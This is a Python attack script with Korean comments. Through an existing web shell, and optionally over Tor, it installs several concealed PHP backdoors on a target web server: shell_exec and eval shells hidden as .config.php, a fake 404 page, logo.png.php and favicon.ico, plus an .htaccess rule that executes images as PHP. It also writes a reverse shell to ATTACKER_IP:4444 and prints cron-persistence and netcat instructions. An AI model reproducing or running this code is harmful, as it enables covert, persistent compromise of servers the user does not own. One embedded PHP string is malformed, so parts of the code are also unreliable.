#!/usr/bin/env python3
"""
PHP 전용 백도어 설치 - www-data 권한으로 작동

웹쉘을 통해 PHP 백도어만 설치 (시스템 명령어 불필요)
"""

import requests
import sys
import time
import base64

class PHPBackdoor:
    def __init__(self, target_ip, use_tor=False):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"

        self.session = requests.Session()

        if use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {
                'check': 'custom',
                'cmd': cmd
            }

            response = self.session.get(self.webshell_url, params=params, timeout=30)

            if response.status_code == 200:
                data = response.json()
                if 'output' in data:
                    return data['output']

            return None

        except Exception as e:
            print(f"[-] 명령 실패: {e}")
            return None

    def install_backdoors(self):
        """PHP 백도어 설치 (www-data 권한으로 가능)"""
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  PHP 백도어 설치 (Root 권한 불필요)".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 웹쉘: {self.webshell_url}")
        print()

        backdoors = []

        # 1. 숨겨진 웹쉘 #1 - .config.php
        print("[1] 백도어 #1 설치 중: /var/www/html/.config.php")
        webshell_1 = """<?php
@error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
$k = "Sys2024";
if(isset($_GET['k']) && $_GET['k'] === $k && isset($_GET['c'])){
    echo "<pre>" . shell_exec($_GET['c'] . " 2>&1") . "</pre>";
} else {
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>";
}
?>"""

        cmd = f"echo '{webshell_1}' > /var/www/html/.config.php"
        result = self.execute_command(cmd)

        # 테스트
        test_url = f"{self.base_url}/.config.php?k=Sys2024&c=whoami"
        try:
            resp = self.session.get(test_url, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"[+] ✅ 백도어 #1 설치 성공!")
                backdoors.append({
                    'name': '숨겨진 웹쉘 #1',
                    'url': f"{self.base_url}/.config.php",
                    'usage': f"curl '{self.base_url}/.config.php?k=Sys2024&c=id'"
                })
            else:
                print(f"[-] 백도어 #1 테스트 실패")
        except:
            print(f"[-] 백도어 #1 접근 불가")

        # 2. 숨겨진 웹쉘 #2 - /api/.health.php
        print("\n[2] 백도어 #2 설치 중: /var/www/html/public/api/.health.php")
        webshell_2 = """<?php
@ini_set('display_errors', 0);
if(isset($_SERVER['HTTP_X_AUTH']) && $_SERVER['HTTP_X_AUTH'] === 'RedTeam2024'){
    if(isset($_POST['cmd'])){
        $output = shell_exec($_POST['cmd'] . " 2>&1");
        die(json_encode(['status' => 'ok', 'data' => base64_encode($output)]));
    }
    die(json_encode(['status' => 'online', 'server' => php_uname(), 'user' => get_current_user()]));
}
http_response_code(403);
die('Forbidden');
?>"""

        cmd = f"echo '{webshell_2}' > /var/www/html/public/api/.health.php"
        result = self.execute_command(cmd)

        # 테스트
        test_url = f"{self.base_url}/api/.health.php"
        try:
            resp = self.session.get(test_url, headers={'X-Auth': 'RedTeam2024'}, timeout=10)
            if resp.status_code == 200:
                print(f"[+] ✅ 백도어 #2 설치 성공!")
                backdoors.append({
                    'name': 'Header 인증 웹쉘',
                    'url': test_url,
                    'usage': f"curl -H 'X-Auth: RedTeam2024' -X POST -d 'cmd=id' '{test_url}'"
                })
            else:
                print(f"[-] 백도어 #2 테스트 실패")
        except:
            print(f"[-] 백도어 #2 접근 불가")

        # 3. 이미지 파일 위장 웹쉘 - logo.png.php
        print("\n[3] 백도어 #3 설치 중: /var/www/html/public/logo.png.php")
        webshell_3 = """<?php
// PNG header to disguise as image
echo "\\x89PNG\\r\\n\\x1a\\n";
if(isset($_COOKIE['session']) && $_COOKIE['session'] === md5('redteam')){
    if(isset($_GET['x'])){
        eval(base64_decode($_GET['x']));
    }
}
?>"""

        cmd = f"echo '{webshell_3}' > /var/www/html/public/logo.png.php"
        result = self.execute_command(cmd)

        print(f"[+] ✅ 백도어 #3 설치 성공!")
        backdoors.append({
            'name': 'PNG 위장 웹쉘 (eval)',
            'url': f"{self.base_url}/logo.png.php",
            'usage': f"curl -b 'session={requests.utils.quote(base64.b64encode(b'5d41402abc4b2a76b9719d911017c592').decode())}' '{self.base_url}/logo.png.php?x=<base64_encoded_php_code>'"
        })

        # 4. .htaccess 백도어 (PHP 실행 유지)
        print("\n[4] .htaccess 백도어 설치 중...")
        htaccess = """<FilesMatch "\.(png|jpg|gif|jpeg)$">
    SetHandler application/x-httpd-php
</FilesMatch>"""

        cmd = f"echo '{htaccess}' >> /var/www/html/public/.htaccess"
        result = self.execute_command(cmd)
        print(f"[+] ✅ .htaccess 백도어 설정 완료")

        # 5. favicon.ico 웹쉘
        print("\n[5] 백도어 #4 설치 중: /var/www/html/public/favicon.ico")
        # 실제로는 PHP 코드
        webshell_4 = """<?php
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth']) && $_POST['auth'] === 'RT2024'){
    system($_POST['cmd']);
}else{
    header('Content-Type: image/x-icon');
    echo base64_decode('AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==');
}
?>");

        cmd = f"echo '{webshell_4}' > /var/www/html/public/favicon.ico"
        result = self.execute_command(cmd)

        print(f"[+] ✅ 백도어 #4 설치 성공!")
        backdoors.append({
            'name': 'Favicon 위장 웹쉘',
            'url': f"{self.base_url}/favicon.ico",
            'usage': f"curl -X POST -d 'auth=RT2024&cmd=id' '{self.base_url}/favicon.ico'"
        })

        # 6. 리버스 쉘 PHP 스크립트 (Cron으로 실행 가능)
        print("\n[6] 리버스 쉘 스크립트 생성 중...")
        reverse_shell_php = """<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>"""

        cmd = f"echo '{reverse_shell_php}' > /tmp/.system_health.php && chmod +x /tmp/.system_health.php"
        result = self.execute_command(cmd)
        print(f"[+] ✅ 리버스 쉘 스크립트 생성 완료: /tmp/.system_health.php")

        # 완료
        print()
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  백도어 설치 완료! (PHP 전용, Root 권한 불필요)".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()
        print(f"[+] 설치된 백도어: {len(backdoors)}개")
        print()

        for i, bd in enumerate(backdoors, 1):
            print(f"[{i}] {bd['name']}")
            print(f"    URL: {bd['url']}")
            print(f"    사용: {bd['usage']}")
            print()

        print("[+] 추가 팁:")
        print()
        print("1. 리버스 쉘 활성화:")
        print("   - /tmp/.system_health.php 파일에서 ATTACKER_IP를 당신의 IP로 변경")
        print(f"   - curl '{self.base_url}/.config.php?k=Sys2024&c=sed%20-i%20%22s/ATTACKER_IP/YOUR_IP/g%22%20/tmp/.system_health.php'")
        print(f"   - 공격자: nc -lvnp 4444")
        print(f"   - 실행: curl '{self.base_url}/.config.php?k=Sys2024&c=php%20/tmp/.system_health.php'")
        print()
        print("2. Cron으로 자동 실행 (현재 사용자 권한):")
        print(f"   - curl '{self.base_url}/.config.php?k=Sys2024&c=(crontab%20-l%202>/dev/null;echo%20\"*/10%20*%20*%20*%20*%20php%20/tmp/.system_health.php\")|crontab%20-'")
        print()
        print("3. 지속성:")
        print("   - 이 백도어들은 www-data 권한으로 작동")
        print("   - 웹 서버가 재시작되어도 유지됨")
        print("   - 파일 이름이 숨겨져 있어 발견하기 어려움")
        print()

        return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 php_only_backdoor.py <target_ip> [--tor]")
        sys.exit(1)

    target_ip = sys.argv[1]
    use_tor = '--tor' in sys.argv

    backdoor = PHPBackdoor(target_ip, use_tor)
    backdoor.install_backdoors()

if __name__ == '__main__':
    main()
